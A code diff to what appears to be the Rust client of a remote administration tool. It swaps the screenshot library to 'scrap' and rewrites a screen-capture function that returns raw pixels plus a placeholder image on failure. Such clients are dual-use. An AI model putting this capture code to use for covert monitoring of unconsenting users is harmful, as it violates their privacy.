@@ -1,5 +1,6 @@
 use sysinfo::{ System, Disks };
-use screenshots::{ image, Screen };
+use scrap::Capturer;
+use scrap::Display;
 
 use std::io::Cursor;
 use std::ptr;
@@ -105,20 +106,81 @@ pub fn client_info(group: String) -> ClientInfo{
     client_data
 }
 
-pub fn take_screenshot(display: i32) -> Vec<u8> {
-    let screens = Screen::all().unwrap();
-
-    let screen = screens[display as usize];
-
-    let image = screen.capture().unwrap();
-
-    let mut bytes: Vec<u8> = Vec::new();
-
-    image
-        .write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Jpeg(35))
-        .expect("Couldn't write image to bytes.");
-
-    bytes
+pub fn take_screenshot(display: i32) -> (usize, usize, Vec<u8>) {
+    // Get primary display for now (display parameter is ignored for simplicity)
+    let display = match Display::primary() {
+        Ok(display) => display,
+        Err(e) => {
+            eprintln!("Failed to get primary display: {}", e);
+            // Return a small valid image in case of failure
+            return (2, 2, vec![0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255]);
+        }
+    };
+    
+    let mut capturer = match Capturer::new(display) {
+        Ok(capturer) => capturer,
+        Err(e) => {
+            eprintln!("Failed to create capturer: {}", e);
+            // Return a small valid image in case of failure
+            return (2, 2, vec![0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255]);
+        }
+    };
+    
+    // Get dimensions and ensure they're even (required for YUV420)
+    let mut w = capturer.width();
+    let mut h = capturer.height();
+    
+    // Ensure width and height are even numbers (required for YUV420)
+    w = w - (w % 2);
+    h = h - (h % 2);
+    
+    // Try up to 10 times to get a frame (with timeouts)
+    for _ in 0..10 {
+        match capturer.frame() {
+            Ok(buffer) => {
+                // Calculate stride and prepare output buffer
+                let stride = buffer.len() / h;
+                let mut bitflipped = Vec::with_capacity(w * h * 4);
+                
+                // Convert to BGRA format
+                for y in 0..h {
+                    for x in 0..w {
+                        let i = stride * y + 4 * x;
+                        
+                        // Check bounds to prevent buffer overruns
+                        if i + 2 < buffer.len() {
+                            bitflipped.extend_from_slice(&[
+                                buffer[i],     // B
+                                buffer[i + 1], // G
+                                buffer[i + 2], // R    
+                                255,           // A
+                            ]);
+                        } else {
+                            // Fill with black if out of bounds
+                            bitflipped.extend_from_slice(&[0, 0, 0, 255]);
+                        }
+                    }
+                }
+                
+                return (w, h, bitflipped);
+            },
+            Err(error) => {
+                if error.kind() == std::io::ErrorKind::WouldBlock {
+                    // Wait a bit and try again
+                    std::thread::sleep(std::time::Duration::from_millis(100));
+                    continue;
+                } else {
+                    eprintln!("Screenshot error: {}", error);
+                    // Return a small valid image in case of failure
+                    return (2, 2, vec![0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255]);
+                }
+            }
+        };
+    }
+    
+    // If we get here, we failed to capture after multiple attempts
+    eprintln!("Failed to capture screenshot after multiple attempts");
+    return (2, 2, vec![0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255]);
 }
 
 pub fn visit_website(
